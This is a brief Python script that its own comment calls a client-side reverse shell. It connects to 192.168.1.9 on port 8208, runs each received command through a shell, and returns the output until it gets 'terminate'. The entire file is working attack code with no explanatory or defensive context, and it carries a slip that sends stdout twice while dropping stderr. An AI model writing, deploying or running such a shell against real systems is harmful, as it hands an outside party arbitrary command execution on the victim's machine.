import socket,subprocess
# client side reverse shell script
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.9", 8208))
    while True:
        cmd = s.recv(1024)
        if b'terminate' in cmd:
            s.close()
            break
        else:
            CMD = subprocess.Popen(cmd.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stdout.read())
main()